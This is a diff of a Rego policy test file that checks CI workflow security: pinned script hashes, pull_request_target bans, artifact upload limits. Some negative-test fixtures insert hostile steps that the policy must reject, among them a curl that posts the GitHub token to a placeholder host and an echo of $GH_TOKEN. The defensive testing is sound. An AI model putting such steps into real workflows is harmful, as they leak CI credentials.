@@ -14,7 +14,7 @@ test_allows_exact_openclaw_legacy_operation if {
 test_rejects_changed_openclaw_legacy_operation if {
 	every candidate in [
 		workflow_with_openclaw_legacy_operation(
-			replace(openclaw_legacy_run, "705d3358ba16bd01846affc1633800a41220e819aa77a8610aec1a8c7b093596", "0000000000000000000000000000000000000000000000000000000000000000"),
+			replace(openclaw_legacy_run, "928255faf367006ae1c767c3fb27fc6a71e35dd5440908265418ba7dc61e0ed7", "0000000000000000000000000000000000000000000000000000000000000000"),
 			{"contents": "read", "id-token": "write"},
 		),
 		workflow_with_openclaw_legacy_operation(openclaw_legacy_run, {"contents": "write", "id-token": "write"}),
@@ -26,15 +26,37 @@ test_rejects_changed_openclaw_legacy_operation if {
 	}
 }
 
+test_allows_fixed_openclaw_phase_tail if {
+	private_live_tail(`then
+phase="$(cat "$OPENCLAW_PHASE_FILE" 2>/dev/null || true)"
+case "$phase" in preflight|baseline|publication|publication-lookup|publication-lookup-denied|publication-lookup-failed|publication-lookup-response|publication-upload|publication-version|verification)
+  echo "::error::Legacy operation failed in ${phase}; private cluster and archive diagnostics withheld." ;;
+*) echo "::error::Legacy operation failed; private cluster and archive diagnostics withheld." ;;
+esac
+exit 1
+fi
+echo "Legacy operation completed; private receipts withheld."`)
+}
+
+test_rejects_unbounded_openclaw_phase_tail if {
+	not private_live_tail(`then
+phase="$(cat "$OPENCLAW_PHASE_FILE")"
+echo "$phase"
+exit 1
+fi
+echo "Legacy operation completed; private receipts withheld."`)
+}
+
 openclaw_legacy_run := `set -euo pipefail
 umask 077
-sha256sum --check --status <<<'705d3358ba16bd01846affc1633800a41220e819aa77a8610aec1a8c7b093596  scripts/ci/openclaw-enterprise-operations.sh'
+export OPENCLAW_PHASE_FILE="${RUNNER_TEMP}/openclaw-phase"
+sha256sum --check --status <<<'928255faf367006ae1c767c3fb27fc6a71e35dd5440908265418ba7dc61e0ed7  scripts/ci/openclaw-enterprise-operations.sh'
 bash scripts/ci/openclaw-enterprise-operations.sh "$RUN_STAGE"
 `
 
 workflow_with_openclaw_legacy_operation(run, permissions) := {
 	"name": "OpenClaw Enterprise Operations",
-	"true": {"workflow_dispatch": {"inputs": {"legacy_stage": {"options": ["inventory", "archive", "verify"]}}}},
+	"true": {"workflow_dispatch": {"inputs": {"legacy_stage": {"options": ["inventory", "publish-inventory", "archive", "verify"]}}}},
 	"jobs": {"legacy": {
 		"needs": ["static-policy"],
 		"environment": {"name": "homelab-production"},
@@ -86,6 +108,71 @@ test_allows_digest_pinned_workflow_images if {
 		"ghcr.io/example/service@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
 	)
 	count(violations) == 0
+}
+
+test_rejects_generic_pull_request_target_workflow if {
+	workflow := object.union(workflow_with_live_run("echo safe"), {"on": "pull_request_target"})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_allows_exact_native_receipt_provenance_workflow if {
+	violations := deny with input as native_receipt_provenance_fixture
+	count(violations) == 0
+}
+
+test_rejects_native_receipt_provenance_with_canceling_concurrency if {
+	workflow := object.union(native_receipt_provenance_fixture, {"concurrency": {"group": "native-chainguard-receipt-provenance", "cancel-in-progress": true}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_write_permission if {
+	base := native_receipt_provenance_fixture
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {
+		"permissions": {"actions": "read", "contents": "write"},
+	})}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_changed_verifier_step if {
+	base := native_receipt_provenance_fixture
+	steps := [
+		base.jobs.verify.steps[0],
+		object.union(base.jobs.verify.steps[1], {"run": "echo \"$GH_TOKEN\""}),
+	]
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_extra_step if {
+	base := native_receipt_provenance_fixture
+	steps := array.concat(base.jobs.verify.steps, [{"run": "curl --data '${{ github.token }}' https://example.invalid"}])
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_head_checkout if {
+	base := native_receipt_provenance_fixture
+	checkout := object.union(base.jobs.verify.steps[0], {"with": object.union(
+		base.jobs.verify.steps[0].with,
+		{"ref": "${{ github.event.pull_request.head.sha }}"},
+	)})
+	workflow := object.union(base, {"jobs": {"verify": object.union(
+		base.jobs.verify,
+		{"steps": [checkout, base.jobs.verify.steps[1]]},
+	)}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
 }
 
 test_rejects_public_live_command_output if {
@@ -493,9 +580,10 @@ test_rejects_modified_harbor_mirror_status if {
 		replace(harbor_mirror_private_run, `trap 'rm -f "$private_log" "$public_status"' EXIT`, `trap 'rm -f "$private_log"' EXIT`),
 		replace(harbor_mirror_private_run, "sha256sum --check --status", "true"),
 		replace(harbor_mirror_private_run, "&& sha256sum", "|| sha256sum"),
-		replace(harbor_mirror_private_run, "7b7038f6a3d723f155f51aa0503b37427b0f3fd6518dfc956c4a3c2fe6f55f27", "0000000000000000000000000000000000000000000000000000000000000000"),
+		replace(harbor_mirror_private_run, "182d0a208fd388836e8e5150759a4655baa626ff804b38eafcb6e2251abc6773", "0000000000000000000000000000000000000000000000000000000000000000"),
 		replace(harbor_mirror_private_run, "scripts/ci/harbor-publish.sh'", "scripts/ci/other.sh'"),
 		replace(harbor_mirror_private_run, "harbor-publish.sh mirror", "harbor-publish.sh publish"),
+		replace(harbor_mirror_private_run, "harbor-publish.sh mirror-dns", "harbor-publish.sh mirror-other"),
 		replace(harbor_mirror_private_run, `>"$private_log" 2>&1`, ""),
 		replace(harbor_mirror_private_run, "umask 077", "umask 022"),
 		sprintf("%s\necho extra", [harbor_mirror_private_run]),
@@ -550,6 +638,31 @@ test_rejects_live_job_artifact_upload if {
 		some msg in violations
 		contains(msg, "must not upload artifacts")
 	}
+}
+
+test_allows_exact_native_receipt_artifact if {
+	violations := deny with input as workflow_with_native_receipt_artifact(native_receipt_artifact_fixture)
+	count(violations) == 0
+}
+
+test_rejects_modified_native_receipt_artifact if {
+	options := object.union(object.get(native_receipt_artifact_fixture, "with", {}), {
+		"path": "${{ runner.temp }}/other.json",
+	})
+	artifact := object.union(native_receipt_artifact_fixture, {"with": options})
+	violations := deny with input as workflow_with_native_receipt_artifact(artifact)
+	some msg in violations
+	contains(msg, "must not upload artifacts")
+}
+
+test_rejects_intervening_native_receipt_step if {
+	workflow := workflow_with_native_receipt_artifact(native_receipt_artifact_fixture)
+	job := workflow.jobs.receipt
+	steps := [job.steps[0], {"run": "echo unsafe > $RUNNER_TEMP/harbor-native-chainguard-receipt.json"}, job.steps[1]]
+	changed := object.union(workflow, {"jobs": {"receipt": object.union(job, {"steps": steps})}})
+	violations := deny with input as changed
+	some msg in violations
+	contains(msg, "must not upload artifacts")
 }
 
 test_allows_withheld_live_command_output if {
@@ -644,6 +757,17 @@ workflow_with_images(docker_action, job_container, service_image) := {
 	}},
 }
 
+native_receipt_provenance_fixture := {
+	"name": "Verify Native Chainguard Receipt Provenance",
+	"concurrency": {"group": "native-chainguard-receipt-provenance", "cancel-in-progress": false},
+	"true": {
+		"push": {"branches": ["main"]},
+		"pull_request_target": {"branches": ["main"], "types": ["opened", "reopened", "synchronize", "edited"]},
+	},
+	"permissions": {},
+	"jobs": {"verify": native_receipt_provenance_job},
+}
+
 workflow_with_live_run(run) := {
 	"name": "Live output test",
 	"on": "workflow_dispatch",
@@ -696,6 +820,33 @@ test_encrypted_harbor_artifact_exception_is_exact if {
 		some msg in denials
 		contains(msg, "must not upload artifacts")
 	}
+}
+
+native_receipt_artifact_fixture := {
+	"name": "Upload Native Receipt",
+	"uses": "chainguard-actions/actions-upload-artifact@ebf8f2543b7189e9a67dcac1af8cabbc5d7a3fd6",
+	"with": {
+		"name": "harbor-native-chainguard-receipt-${{ github.sha }}",
+		"path": "${{ runner.temp }}/harbor-native-chainguard-receipt.json",
+		"if-no-files-found": "error",
+		"retention-days": 30,
+		"include-hidden-files": false,
+	},
+}
+
+workflow_with_native_receipt_artifact(artifact) := {
+	"name": "Verify Native Chainguard Harbor Imports",
+	"on": "workflow_dispatch",
+	"permissions": {},
+	"env": {"KUBE_API_SERVER_URL": "https://kubernetes-api-ci.stinkyboi.com"},
+	"jobs": {"receipt": {
+		"runs-on": "ubuntu-24.04",
+		"permissions": {"contents": "read", "id-token": "write"},
+		"steps": [
+			{"run": native_receipt_private_run, "env": {"OCTELIUM_AUTH_TOKEN": "test"}},
+			artifact,
+		],
+	}},
 }
 
 test_encrypted_oce_image_artifact_exception_is_exact if {
